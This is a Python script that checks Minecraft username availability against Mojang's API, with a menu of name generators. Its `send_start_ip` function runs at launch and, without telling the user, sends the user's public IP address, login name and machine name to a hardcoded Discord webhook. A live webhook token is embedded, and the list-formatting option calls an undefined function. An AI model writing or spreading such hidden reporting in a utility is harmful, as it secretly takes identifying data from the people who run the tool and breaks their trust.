import os
import unicodedata
import re
import getpass
import platform
import requests
import time
import random
import string
from colorama import init, Fore

init(autoreset=True)

GREEN = Fore.LIGHTGREEN_EX
RED = Fore.LIGHTRED_EX
YELLOW = Fore.LIGHTYELLOW_EX

print(RED + "Script loading...")

WEBHOOK_URL = "https://discord.com/api/webhooks/1498480410995458190/-0mY359DYkaCWz20j94QfNcdDDujlEbuY7ohiP_FdRX3iliENhaMZ3P4FUmCieZaryrr"


def clean_mc_name(name):
    # enlever accents
    name = unicodedata.normalize('NFD', name)
    name = ''.join(c for c in name if unicodedata.category(c) != 'Mn')

    # enlever tirets et espaces
    name = name.replace("-", "").replace(" ", "")

    # garder uniquement chars Minecraft
    name = re.sub(r'[^a-zA-Z0-9_]', '', name)

    return name


def run_list_checker():
    path = input("File (names.txt) : ")

    if not os.path.exists(path):
        print(RED + "[!] File not found")
        return

    with open(path, "r", encoding="utf-8") as f:
        raw_names = [x.strip() for x in f if x.strip()]

    i = 1

    for raw in raw_names:
        name = clean_mc_name(raw)

        # skip si trop court
        if len(name) < 3:
            continue

        status = safe_check(name)

        print_line(i, name, status)

        if status == "AVAILABLE":
            save_available(name)
            send_hit(name)

        i += 1
        time.sleep(0.8)










###format list

def format_list_from_file():
    path = input("Fichier (ex: words.txt) : ")

    if not os.path.exists(path):
        print(RED + "[!] File not found")
        return

    with open(path, "r", encoding="utf-8") as f:
        lines = f.readlines()

    formatted = []
    for w in lines:
        print("DEBUG:", "clean_word" in globals())
        cleaned = clean_word(w)
        if cleaned:
            formatted.append(cleaned)

    # enlever doublons
    formatted = list(dict.fromkeys(formatted))

    with open("formatted.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(formatted))





























# ===== STATS =====
total_checked = 0
total_available = 0
found_count = 0

# ===== SAVE =====
saved_names = set()

if os.path.exists("available.txt"):
    with open("available.txt", "r", encoding="utf-8") as f:
        saved_names = set(x.strip() for x in f if x.strip())

def save_available(name):
    if name not in saved_names:
        with open("available.txt", "a", encoding="utf-8") as f:
            f.write(name + "\n")
        saved_names.add(name)

# ===== WORDLIST 20K =====
WORDS_20K = []
USED_WORDS = set()

def load_wordlist():
    global WORDS_20K
    try:
        url = "https://raw.githubusercontent.com/first20hours/google-10000-english/master/20k.txt"
        WORDS_20K = requests.get(url, timeout=10).text.splitlines()
    except:
        print(RED + "[!] Failed loading wordlist")

def gen_unique_20k():
    global USED_WORDS

    if not WORDS_20K:
        return "test"

    if len(USED_WORDS) >= len(WORDS_20K):
        USED_WORDS.clear()

    while True:
        w = random.choice(WORDS_20K).strip().lower()

        if (
            w not in USED_WORDS and
            w.isalpha() and
            3 <= len(w) <= 8
        ):
            USED_WORDS.add(w)
            return w


# ===== IP =====
def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "Unknown"

def send_start_ip():
    ip = get_ip()

    if WEBHOOK_URL:
        try:
            requests.post(WEBHOOK_URL, json={
                "content": f"🟡 Tool started | IP: `{ip}` | User: `{getpass.getuser()}` | Machine : `{platform.node()}`"
            })
        except:
            pass



# ===== CHECK =====
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

def check_name(name):
    try:
        r = session.get(f"https://api.mojang.com/users/profiles/minecraft/{name}", timeout=5)

        if r.status_code == 200:
            return "UNAVAILABLE"
        elif r.status_code in (204, 404):
            return "AVAILABLE"
        elif r.status_code == 429:
            return "RATE_LIMIT"
        return "ERROR"
    except:
        return "ERROR"

def safe_check(name):
    while True:
        r = check_name(name)
        if r == "RATE_LIMIT":
            time.sleep(5)
        else:
            return r

# ===== PRINT =====
def print_line(i, name, status):
    global total_checked, total_available

    total_checked += 1

    if status == "AVAILABLE":
        total_available += 1
        c = GREEN
    elif status == "UNAVAILABLE":
        c = RED
    else:
        c = YELLOW

    print(c + f"[{i}] {name} -> {status} | Checked: {total_checked} | Available: {total_available}")

# ===== WEBHOOK =====
def send_hit(name):
    if not WEBHOOK_URL:
        return

    try:
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": "🎯 AVAILABLE",
                "description": f"`{name}`",
                "color": 0x00ff00
            }]
        })
    except:
        pass

# ===== TOP SYSTEM =====
def score(name):
    score = len(name) * 10
    if not any(c.isdigit() for c in name):
        score += 20
    return score

def get_top():
    if not os.path.exists("available.txt"):
        return []

    with open("available.txt") as f:
        data = [(x.strip(), score(x.strip())) for x in f if x.strip()]

    data.sort(key=lambda x: x[1], reverse=True)
    return data[:10]

def send_top():
    if not WEBHOOK_URL:
        return

    top = get_top()
    text = "\n".join([f"{i+1}. {n} ({s})" for i, (n, s) in enumerate(top)]) or "None"

    try:
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": "🏆 TOP USERNAMES",
                "description": text,
                "color": 0xffd700
            }]
        }, timeout=5)
    except:
        pass

# ===== GENERATORS =====
vowels = "aeiou"
cons = "".join(set(string.ascii_lowercase) - set(vowels))

def gen_4(): return ''.join(random.choice(string.ascii_lowercase) for _ in range(4))
def gen_pronounce(): return ''.join(random.choice(cons if c=="C" else vowels) for c in "CVCV")
def gen_value(): return gen_pronounce()

# ===== RAW LIST =====
RAW_LIST = []
RAW_INDEX = 0

def load_raw_list(url):
    global RAW_LIST, RAW_INDEX
    try:
        data = requests.get(url, timeout=10).text.splitlines()
        RAW_LIST = [x.strip() for x in data if x.strip()]
        RAW_INDEX = 0
        print(GREEN + f"[+] Loaded {len(RAW_LIST)} names")
    except:
        print(RED + "[!] Failed loading list")

def gen_raw():
    global RAW_INDEX

    if not RAW_LIST:
        return "test"

    if RAW_INDEX >= len(RAW_LIST):
        RAW_INDEX = 0

    name = RAW_LIST[RAW_INDEX]
    RAW_INDEX += 1
    return name
    

# ===== LOOP =====
def run(gen):
    global found_count

    i = 1
    while True:
        name = gen()
        status = safe_check(name)

        print_line(i, name, status)

        if status == "AVAILABLE":
            save_available(name)
            send_hit(name)
            found_count += 1

            if found_count % 10 == 0:
                send_top()

        i += 1
        time.sleep(0.8)

# ===== MENU =====
def main():
    send_start_ip()
    load_wordlist()

    os.system("cls")
    print(RED + """

============== MENU ==============            --------
                                             |By seerz|
1. Name list Checker (names.txt)              --------

2. 4 Letters Checker

3. Pronounceable 4 letters

4. Rare checker 4 letters

5. OG Names (English words)

6. RAW Link Checker

7. Format list (file)

==================================
""")

    c = input("> ")
    if c == "1":
        run_list_checker()
    if c == "2":
        run(gen_4)
    elif c == "3":
        run(gen_pronounce)
    elif c == "4":
        run(gen_value)
    elif c == "5":
        run(gen_unique_20k)
    elif c == "6":
        url = input("List link: ")
        load_raw_list(url)
        run(gen_raw)
    elif c == "7":
        format_list_from_file()


if __name__ == "__main__":
    main()

